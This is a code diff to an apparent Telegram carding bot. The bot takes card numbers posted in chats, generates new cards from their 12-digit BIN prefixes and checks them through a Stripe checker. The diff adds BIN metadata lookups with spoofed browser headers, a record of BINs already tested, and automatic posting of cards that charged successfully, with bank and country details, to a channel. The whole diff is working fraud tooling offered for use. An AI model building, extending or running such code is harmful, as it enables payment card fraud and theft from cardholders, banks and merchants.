@@ -8,6 +8,7 @@ import re
 import asyncio
 import logging
 import os
+from pathlib import Path
 from typing import List, Tuple, Optional, Dict, Set
 from datetime import datetime
 import random
@@ -37,6 +38,10 @@ API_ID = os.getenv('API_ID', 'YOUR_API_ID')
 API_HASH = os.getenv('API_HASH', 'YOUR_API_HASH')
 BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN')
 
+SUCCESS_CHANNEL_ID = int(os.getenv('SUCCESS_CHANNEL_ID', '-1003369945982'))
+BIN_LOOKUP_TIMEOUT = int(os.getenv('BIN_LOOKUP_TIMEOUT', '10'))
+TESTED_BINS_PATH = Path(os.getenv('TESTED_BINS_FILE', 'testedbins.txt'))
+
 # Regex to match card format: 16 digits | 1-2 digits | 2-4 digits | optional CVV
 CARD_PATTERN = re.compile(r'(\d{16})\|(\d{1,2})\|(\d{2,4})(?:\|(\d{3,4}))?')
 
@@ -58,6 +63,96 @@ stats = {
     'bins_processed': {},
     'started_at': datetime.now()
 }
+
+BIN_LOOKUP_HEADERS = {
+    'authority': 'lookup.binlist.net',
+    'accept': '*/*',
+    'accept-language': 'en-US,en;q=0.9',
+    'origin': 'https://binlist.net',
+    'referer': 'https://binlist.net/',
+    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+}
+
+bin_lookup_session: Optional[aiohttp.ClientSession] = None
+bin_info_cache: Dict[str, Dict] = {}
+tested_bins: Set[str] = set()
+
+def _normalize_bin_prefix(bin_prefix: str) -> str:
+    return (bin_prefix or "")[:12]
+
+def load_tested_bins() -> None:
+    """Load tested 12-digit BIN prefixes from file."""
+    global tested_bins
+    if TESTED_BINS_PATH.exists():
+        try:
+            with TESTED_BINS_PATH.open('r', encoding='utf-8') as f:
+                tested_bins = {line.strip() for line in f if line.strip()}
+        except Exception as exc:
+            logger.error(f"Failed to load tested bins: {exc}")
+            tested_bins = set()
+    else:
+        tested_bins = set()
+
+def is_bin_tested(bin_prefix: str) -> bool:
+    """Check if a 12-digit BIN has already been processed."""
+    return _normalize_bin_prefix(bin_prefix) in tested_bins
+
+def mark_bin_tested(bin_prefix: str) -> None:
+    """Persistently mark a 12-digit BIN as processed."""
+    normalized = _normalize_bin_prefix(bin_prefix)
+    if not normalized or normalized in tested_bins:
+        return
+    tested_bins.add(normalized)
+    try:
+        TESTED_BINS_PATH.parent.mkdir(parents=True, exist_ok=True)
+        with TESTED_BINS_PATH.open('a', encoding='utf-8') as f:
+            f.write(normalized + '\n')
+    except Exception as exc:
+        logger.error(f"Failed to persist tested bin {normalized}: {exc}")
+
+async def get_bin_lookup_session() -> aiohttp.ClientSession:
+    """Ensure a shared session for BIN lookups."""
+    global bin_lookup_session
+    if bin_lookup_session is None or bin_lookup_session.closed:
+        timeout = aiohttp.ClientTimeout(total=BIN_LOOKUP_TIMEOUT)
+        bin_lookup_session = aiohttp.ClientSession(timeout=timeout)
+    return bin_lookup_session
+
+async def fetch_bin_details(bin_prefix: str) -> Optional[Dict]:
+    """Fetch metadata for the first 6 digits of the BIN."""
+    bin6 = (bin_prefix or "")[:6]
+    if len(bin6) < 6:
+        return None
+    if bin6 in bin_info_cache:
+        return bin_info_cache[bin6]
+    
+    session = await get_bin_lookup_session()
+    url = f"https://lookup.binlist.net/{bin6}"
+    try:
+        async with session.get(url, headers=BIN_LOOKUP_HEADERS) as resp:
+            if resp.status == 200:
+                data = await resp.json(content_type=None)
+                bin_info_cache[bin6] = data
+                logger.info(f"Fetched BIN info for {bin6}: {data.get('scheme')} {data.get('type')}")
+                return data
+            text = await resp.text()
+            logger.warning(f"BIN lookup failed for {bin6}: HTTP {resp.status} {text}")
+    except Exception as exc:
+        logger.error(f"Error fetching BIN info for {bin6}: {exc}")
+    return None
+
+async def close_bin_lookup_session() -> None:
+    """Close the BIN lookup session if it exists."""
+    global bin_lookup_session
+    if bin_lookup_session and not bin_lookup_session.closed:
+        await bin_lookup_session.close()
+        bin_lookup_session = None
 
 # ==================== LUHN ALGORITHM ====================
 def luhn_checksum(card_number: str) -> int:
@@ -559,6 +654,7 @@ class StripeChecker:
             return False, message
 
 # ==================== BOT LOGIC ====================
+load_tested_bins()
 stripe_checker = StripeChecker()
 
 async def process_card_message(message: Message, app: Client):
@@ -578,6 +674,12 @@ async def process_card_message(message: Message, app: Client):
         
         # Extract BIN (first 12 digits for generation)
         bin_prefix = card_num[:12]
+        if len(bin_prefix) < 12:
+            logger.warning(f"Skipping card with insufficient BIN length from message {message.id}")
+            continue
+        if is_bin_tested(bin_prefix):
+            logger.info(f"BIN {bin_prefix} already tested. Skipping message {message.id}")
+            continue
         
         # Create card info
         card_info = {
@@ -606,6 +708,11 @@ async def process_queue(app: Client):
             # Get next card from queue
             card_info = card_queue.popleft()
             bin_prefix = card_info['bin']
+            if is_bin_tested(bin_prefix):
+                logger.info(f"BIN {bin_prefix} already tested (queue). Skipping.")
+                continue
+            bin_details = await fetch_bin_details(bin_prefix)
+            card_info['bin_details'] = bin_details
             
             # Skip if already processing this BIN
             if bin_prefix in processing_cards:
@@ -668,9 +775,12 @@ async def process_queue(app: Client):
                     'checked': 0,
                     'succeeded': 0,
                     'pmi_attempts': 0,
-                    'pmi_succeeded': 0
+                    'pmi_succeeded': 0,
+                    'bin_details': bin_details
                 }
-            
+            else:
+                stats['bins_processed'][bin_prefix]['bin_details'] = bin_details or stats['bins_processed'][bin_prefix].get('bin_details')
+
             stats['bins_processed'][bin_prefix]['checked'] += len(generated_cards)
             stats['bins_processed'][bin_prefix]['succeeded'] += len(succeeded_cards)
 
@@ -706,6 +816,61 @@ async def process_queue(app: Client):
                     pmi_success_count = sum(1 for _, success, _ in pmi_results if success)
                     stats['total_pmi_succeeded'] += pmi_success_count
                     stats['bins_processed'][bin_prefix]['pmi_succeeded'] += pmi_success_count
+
+                    if pmi_success_count > 0:
+                        auth_success_rate = (len(succeeded_cards) / len(generated_cards) * 100) if generated_cards else 0
+                        pmi_success_rate = (pmi_success_count / len(pmi_cards) * 100) if pmi_cards else 0
+                        bin6 = bin_prefix[:6]
+                        scheme_upper = (bin_details or {}).get('scheme', 'UNKNOWN')
+                        scheme_upper = scheme_upper.upper() if isinstance(scheme_upper, str) else str(scheme_upper)
+                        card_type_upper = (bin_details or {}).get('type', 'UNKNOWN')
+                        card_type_upper = card_type_upper.upper() if isinstance(card_type_upper, str) else str(card_type_upper)
+                        brand_name_raw = (bin_details or {}).get('brand')
+                        if isinstance(brand_name_raw, str):
+                            brand_name = brand_name_raw
+                        elif brand_name_raw is None:
+                            brand_name = "Unknown"
+                        else:
+                            brand_name = str(brand_name_raw)
+
+                        bank_name_raw = ((bin_details or {}).get('bank') or {}).get('name')
+                        if isinstance(bank_name_raw, str):
+                            bank_name = bank_name_raw
+                        elif bank_name_raw is None:
+                            bank_name = "Unknown"
+                        else:
+                            bank_name = str(bank_name_raw)
+                        country_info = (bin_details or {}).get('country') or {}
+                        country_name_raw = country_info.get('name')
+                        if isinstance(country_name_raw, str):
+                            country_name = country_name_raw
+                        elif country_name_raw is None:
+                            country_name = "Unknown"
+                        else:
+                            country_name = str(country_name_raw)
+                        country_emoji_raw = country_info.get('emoji')
+                        country_emoji = country_emoji_raw if isinstance(country_emoji_raw, str) else ""
+
+                        for card_value, success, _ in pmi_results:
+                            if not success:
+                                continue
+                            if card_value.count('|') == 2:
+                                display_card = f"{card_value}|xxx"
+                            else:
+                                display_card = card_value
+                            summary_text = (
+                                f"{display_card} - #{bin6} - {scheme_upper} - {card_type_upper} - "
+                                f"{brand_name} - {bank_name} - {country_name} {country_emoji} - "
+                                f"PMI ✅ {pmi_success_rate:.1f}% - CHECK ✅ {auth_success_rate:.1f}%"
+                            )
+                            try:
+                                await app.send_message(
+                                    SUCCESS_CHANNEL_ID,
+                                    summary_text,
+                                    disable_web_page_preview=True
+                                )
+                            except Exception as send_exc:
+                                logger.error(f"Failed to send success summary to channel: {send_exc}")
             
             # Send report to owner
             await send_report(
@@ -716,6 +881,9 @@ async def process_queue(app: Client):
                 failed_count,
                 pmi_results
             )
+            
+            # Mark this BIN as tested to avoid duplicate processing
+            mark_bin_tested(bin_prefix)
             
             # Remove from processing
             processing_cards.remove(bin_prefix)
@@ -734,6 +902,17 @@ async def send_report(app: Client, card_info: Dict, generated: List[str], succee
     pmi_successes = sum(1 for _, success, _ in pmi_results if success)
     pmi_failures = pmi_attempts - pmi_successes
     pmi_success_rate = (pmi_successes / pmi_attempts * 100) if pmi_attempts else 0
+    bin_details = card_info.get('bin_details') or stats['bins_processed'].get(bin_prefix, {}).get('bin_details')
+    
+    scheme = (bin_details or {}).get('scheme') or "Unknown"
+    card_type = (bin_details or {}).get('type') or "Unknown"
+    brand = (bin_details or {}).get('brand') or "Unknown"
+    bank_info = (bin_details or {}).get('bank') or {}
+    country_info = (bin_details or {}).get('country') or {}
+    
+    bank_name = bank_info.get('name') or "Unknown"
+    country_name = country_info.get('name') or "Unknown"
+    country_emoji = country_info.get('emoji') or ""
     
     # Create report message
     report = f"""
@@ -745,6 +924,13 @@ async def send_report(app: Client, card_info: Dict, generated: List[str], succee
 ├ BIN: `{bin_prefix}`
 ├ Original Card: `{card_info['original_card']}`
 └ Message ID: `{card_info['message_id']}`
+
+🏦 **BIN Details**
+├ Scheme: `{scheme.upper()}`
+├ Type: `{card_type.upper()}`
+├ Brand: `{brand}`
+├ Bank: `{bank_name}`
+└ Country: `{country_name} {country_emoji}`
 
 📈 **Check Results**
 ├ Total Generated: `{len(generated)}`
@@ -834,6 +1020,9 @@ async def main():
 📈 Total Checked: `{stats['total_checked']}`
 ✅ Total Succeeded: `{stats['total_succeeded']}`
 📊 Success Rate: `{(stats['total_succeeded']/stats['total_checked']*100) if stats['total_checked'] else 0:.1f}%`
+💳 PMI Attempts: `{stats['total_pmi_attempts']}`
+💳 PMI Charged: `{stats['total_pmi_succeeded']}`
+💳 PMI Rate: `{(stats['total_pmi_succeeded']/stats['total_pmi_attempts']*100) if stats['total_pmi_attempts'] else 0:.1f}%`
 
 🔢 BINs Processed: `{len(stats['bins_processed'])}`
 📋 Queue Size: `{len(card_queue)}`
